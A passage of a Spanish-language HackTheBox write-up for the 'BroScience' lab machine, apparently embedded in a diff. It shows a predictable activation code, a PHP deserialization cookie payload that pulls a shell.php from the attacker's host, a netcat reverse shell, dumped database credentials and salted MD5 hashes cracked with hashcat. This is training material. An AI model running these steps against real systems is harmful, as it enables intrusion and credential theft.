+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="c1">// Check if variables are empty</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>    
+        <span class="k">include_once</span> <span class="s1">'includes/db_connect.php'</span><span class="p">;</span>
+        
+        <span class="c1">// Check if username:password is correct</span>
+        <span class="nv">$res</span> <span class="o">=</span> <span class="nb">pg_prepare</span><span class="p">(</span><span class="nv">$db_conn</span><span class="p">,</span> <span class="s2">"login_query"</span><span class="p">,</span> <span class="s1">'SELECT id, username, is_activated::int, is_admin::int FROM users WHERE username=$1 AND password=$2'</span><span class="p">);</span>
+        <span class="nv">$res</span> <span class="o">=</span> <span class="nb">pg_execute</span><span class="p">(</span><span class="nv">$db_conn</span><span class="p">,</span> <span class="s2">"login_query"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$db_salt</span> <span class="mf">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])));</span>
+        
+        <span class="k">if</span> <span class="p">(</span><span class="nb">pg_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// Check if account is activated</span>
+            <span class="nv">$row</span> <span class="o">=</span> <span class="nb">pg_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">((</span><span class="n">bool</span><span class="p">)</span><span class="nv">$row</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="p">{</span>
+                <span class="c1">// User is logged in</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'is_admin'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+
+                <span class="c1">// Redirect to home page</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php'</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$alert</span> <span class="o">=</span> <span class="s2">"Account is not activated yet"</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$alert</span> <span class="o">=</span> <span class="s2">"Username or password is incorrect."</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$alert</span> <span class="o">=</span> <span class="s2">"Please fill in both username and password."</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+
+<span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;title&gt;</span>BroScience : Log In<span class="nt">&lt;/title&gt;</span>
+        <span class="cp">&lt;?php</span> <span class="k">include_once</span> <span class="s1">'includes/header.php'</span><span class="p">;</span> <span class="cp">?&gt;</span>
+    <span class="nt">&lt;/head&gt;</span>
+    <span class="nt">&lt;body&gt;</span>
+        <span class="cp">&lt;?php</span> <span class="k">include_once</span> <span class="s1">'includes/navbar.php'</span><span class="p">;</span> <span class="cp">?&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"uk-container uk-container-xsmall"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">"uk-form-stacked"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"login.php"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;fieldset</span> <span class="na">class=</span><span class="s">"uk-fieldset"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;legend</span> <span class="na">class=</span><span class="s">"uk-legend"</span><span class="nt">&gt;</span>Log In<span class="nt">&lt;/legend&gt;</span>
+                    <span class="cp">&lt;?php</span>
+                    <span class="c1">// Display any alerts</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$alert</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cp">?&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">uk-alert</span> <span class="na">class=</span><span class="s">"uk-alert-</span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$alert_type</span><span class="p">)){</span><span class="k">echo</span> <span class="nv">$alert_type</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="k">echo</span> <span class="s1">'danger'</span><span class="p">;}</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"uk-alert-close"</span> <span class="na">uk-close</span><span class="nt">&gt;&lt;/a&gt;</span>
+                            <span class="cp">&lt;?=</span><span class="nv">$alert</span><span class="cp">?&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                    <span class="cp">&lt;?php</span>
+                    <span class="p">}</span>
+                    <span class="cp">?&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"uk-margin"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">class=</span><span class="s">"uk-input"</span> <span class="na">placeholder=</span><span class="s">"Username"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"uk-margin"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">class=</span><span class="s">"uk-input"</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"Password"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"uk-margin"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">"uk-button uk-button-default"</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Log in<span class="nt">&lt;/button&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"uk-margin"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"register.php"</span><span class="nt">&gt;</span>Create an account<span class="nt">&lt;/a&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/fieldset&gt;</span>
+            <span class="nt">&lt;/form&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Viendo el codigo, intentamos ver el <code class="language-plaintext highlighter-rouge">register.php</code> viendo que no hay una ruta sabemos que se encuentra en en el mismo directorio, procedemos a leerlo.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/10.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Registrer</em></p>
+
+<p>Vemos como activar la cuenta</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/13.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Activation Code</em></p>
+
+<p>Al seguir analizando vemos que  llama  a <code class="language-plaintext highlighter-rouge">includes/utils.php</code>, procedemos a leerlo.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/11.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Activation Code</em>
+Si lo leemos veremos esta función de PHP.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/12.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Function</em></p>
+
+<h2 id="activando-la-cuenta"><span class="mr-2">Activando la cuenta</span><a href="#activando-la-cuenta" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Nos creamos una cuenta y la interceptamos con BrupSuite, la mandamos al <code class="language-plaintext highlighter-rouge">Reapeter</code> la enviamos y copiamos la fecha.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/14.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Date</em></p>
+
+<p>Con la función PHP ponemos nuestra fecha y nos dara el codigo, Creamos un archivo.php</p>
+
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="n">generate_activation_code</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nv">$chars</span> <span class="o">=</span> <span class="s2">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span><span class="p">;</span>
+    <span class="nb">srand</span><span class="p">(</span><span class="nb">strtotime</span><span class="p">(</span><span class="s2">"Fri, 31 Mar 2023 20:59:29 GMT"</span><span class="p">));</span>
+    <span class="nv">$activation_code</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$activation_code</span> <span class="o">=</span> <span class="nv">$activation_code</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
+    <span class="p">}</span>
+    <span class="k">echo</span> <span class="nv">$activation_code</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nf">generate_activation_code</span><span class="p">()</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Lo ejecutamos…</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>❯ php code.php
+HmKj5RgqljPy3516zxzpf2f5S2rBwzn9
+</pre></td></tr></tbody></table></code></div></div>
+<p>Copiamos el código y lo ingresamos en:</p>
+<blockquote>
+  <p>https://broscience.htb/activate.php?code=</p>
+</blockquote>
+
+<p>Iniciamos sesión y estamos adentro.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/hacker-glitch.gif" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>H4CKED!!!</em></p>
+
+<h2 id="ganando-accseso"><span class="mr-2">Ganando accseso</span><a href="#ganando-accseso" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Revisamos de nuevo el utils.php y vemos el siguiente codigo:</p>
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">Avatar</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$imgPath</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$imgPath</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span> <span class="o">=</span> <span class="nv">$imgPath</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">save</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
+        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">));</span>
+        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">AvatarInterface</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$tmp</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$imgPath</span><span class="p">;</span> 
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Avatar</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">);</span>
+        <span class="nv">$a</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">tmp</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>La clase avatar tiene un parámetro imgPath que se usa para indicar la ruta de la imagen y un parámetro tmp abre la imagen y guarda su contenido en el servidor.
+La interfaz de avatar tiene un nombre de método/función __wakeup()que crea una nueva instancia de clase de avatar y un método de guardado de clase para la clase de avatar.Entonces, en teoría, si pudiéramos establecer la ruta img en nuestro servidor y hacer que reciba un shell PHP, la ruta tmp lo almacenará en el servidor y podríamos activar un shell inverso después de activarlo.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/16.png" alt="Events " class="center-image" data-proofer-ignore>
+<em>Utils.php modificado</em></p>
+
+<p>Lo ejecutamos..</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>❯ php utils-avatar.php
+<span class="nv">TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE0LjUwL3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3NoZWxsLnBocCI7fQ</span><span class="o">==</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Usando un CookieEditor lo copiamos y lo introducimos en donde dice  <code class="language-plaintext highlighter-rouge">user-prefs</code>.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/17.png" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>Cookie</em></p>
+
+<p>Nos creamos una shell.php con ese nombre y abrimos un servidor python.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python <span class="nt">-m</span> http.server 80
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Y nustro Listenig….</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>nc <span class="nt">-lvnp</span> 443
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>En el navegador hacemos referencia a ese archivo y Pwned!!!.</p>
+<blockquote>
+  <p>Recuerda aplicar el <a href="https://h4ckerlite.github.io/posts/tty/">Tratamiento a la TTY</a></p>
+  <div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>❯ nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.50] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.195] 35568
+Linux broscience 5.10.0-20-amd64 <span class="c">#1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux</span>
+ 19:08:51 up 18:09,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1230<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@broscience:/<span class="nv">$ </span>
+</pre></td></tr></tbody></table></code></div>  </div>
+</blockquote>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/roblox.gif" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>PWNED!!!</em></p>
+
+<h2 id="migrando-de-www-data-a-bill"><span class="mr-2">Migrando de WWW-DATA a Bill</span><a href="#migrando-de-www-data-a-bill" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Si se acuerdan de la carpata includes había una archivo db_connect.php, lo miramos.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre>www-data@broscience:/var/www/html<span class="nv">$ </span><span class="nb">ls </span>includes/
+db_connect.php	header.php  img.php  navbar.php  utils.php
+www-data@broscience:/var/www/html<span class="nv">$ </span><span class="nb">cat </span>includes/db_connect.php 
+&lt;?php
+<span class="nv">$db_host</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$db_port</span> <span class="o">=</span> <span class="s2">"5432"</span><span class="p">;</span>
+<span class="nv">$db_name</span> <span class="o">=</span> <span class="s2">"broscience"</span><span class="p">;</span>
+<span class="nv">$db_user</span> <span class="o">=</span> <span class="s2">"dbuser"</span><span class="p">;</span>
+<span class="nv">$db_pass</span> <span class="o">=</span> <span class="s2">"RangeOfMotion%777"</span><span class="p">;</span>
+<span class="nv">$db_salt</span> <span class="o">=</span> <span class="s2">"NaCl"</span><span class="p">;</span>
+
+<span class="nv">$db_conn</span> <span class="o">=</span> pg_connect<span class="o">(</span><span class="s2">"host={</span><span class="nv">$db_host</span><span class="s2">} port={</span><span class="nv">$db_port</span><span class="s2">} dbname={</span><span class="nv">$db_name</span><span class="s2">} user={</span><span class="nv">$db_user</span><span class="s2">} password={</span><span class="nv">$db_pass</span><span class="s2">}"</span><span class="o">)</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="o">(!</span><span class="nv">$db_conn</span><span class="o">)</span> <span class="o">{</span>
+    die<span class="o">(</span><span class="s2">"&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database"</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Vemos claves para una Base de Datos, pero mysql no esta instalado. Pero… vemos un puerto. Buscando en Google vemos que se tratat de <code class="language-plaintext highlighter-rouge">postgresql</code>. Usando este <a href="https://hasura.io/blog/top-psql-commands-and-flags-you-need-to-know-postgresql/">blog</a> nos enseñan a conectarnos.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>www-data@broscience:/var/www/html/includes<span class="nv">$ </span>psql <span class="nt">-h</span> localhost <span class="nt">-p</span> 5432 <span class="nt">-d</span> broscience <span class="nt">-U</span> dbuser <span class="nt">-W</span>
+Password: RangeOfMotion%777
+psql <span class="o">(</span>13.9 <span class="o">(</span>Debian 13.9-0+deb11u1<span class="o">))</span>
+SSL connection <span class="o">(</span>protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off<span class="o">)</span>
+Type <span class="s2">"help"</span> <span class="k">for </span>help.
+
+<span class="nv">broscience</span><span class="o">=&gt;</span> 
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Mostramos las tablas disponibles.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>broscience-&gt; <span class="se">\d</span>t
+           List of relations
+ Schema |   Name    | Type  |  Owner   
+<span class="nt">--------</span>+-----------+-------+----------
+ public | comments  | table | postgres
+ public | exercises | table | postgres
+ public | <span class="nb">users</span>     | table | postgres
+<span class="o">(</span>3 rows<span class="o">)</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Mostramos la data de la tabla</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="nv">oscience</span><span class="o">=&gt;</span> <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+ <span class="nb">id</span> |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
+<span class="nt">----</span>+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
+  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
+  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
+  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
+  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
+  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
+  6 | mrt420        | 71d63fd0df7f8fb5e5121cbad6754799 | mrt420@mrt.com               | 3SdFiMzFushSzTBvEgP85atGTRBWH9r9 | f            | f        | 2023-03-31 19:32:22.994831-04
+<span class="o">(</span>6 rows<span class="o">)</span>
+
+<span class="nv">broscience</span><span class="o">=&gt;</span> 
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Copiamos los nombres y los hashes MD5. Con ayuda de REGEX podemos darle el formato apropiado</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">cat hash</span>  | <span class="nb">sed</span> <span class="nt">-E</span> <span class="s1">'s/^(\w+)\s*\|\s*(\w+)$/\1:\2/'</span> <span class="o">&gt;</span> hashs
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>El hash esta salado, hacemos lo siguiente</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>15657792073e8a843d4f91fc403454e1:NaCl
+13edad4932da9dbb57d9cd15b66ed104:NaCl
+bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
+a7eed23a7be6fe0d765197b1027453fe:NaCl
+5d15340bded5b9395d5d14b9c21bc82b:NaCl
+71d63fd0df7f8fb5e5121cbad6754799:NaCl
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Ahora necesitamos el modo correcto, les comparto la siguiente <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">wiki</a>.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>❯ hashcat <span class="nt">-m</span> 20 hashs /usr/share/wordlists/rockyou.txt
+</pre></td></tr></tbody></table></code></div></div>
+<p>En un momento tendremos las contraseñas.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/18.png" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>PWNED!!!</em></p>
+
+<p>Migramos…</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>su bill
+</pre></td></tr></tbody></table></code></div></div>
+<p>bill@broscience:~$ cat user.txt 
+be<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><em>**</em>50
+bill@broscience:~$</p>
+
+<p>Tenemos la priemra flag!</p>
+<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Usando <a href="https://github.com/DominicBreuker/pspy">pspy64</a> para ver procesos de root. Encontramos lo siguiente.</p>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/19.png" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>PsPy</em></p>
+
+<p>leyendo el contenido nos encontramos con un script de bash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
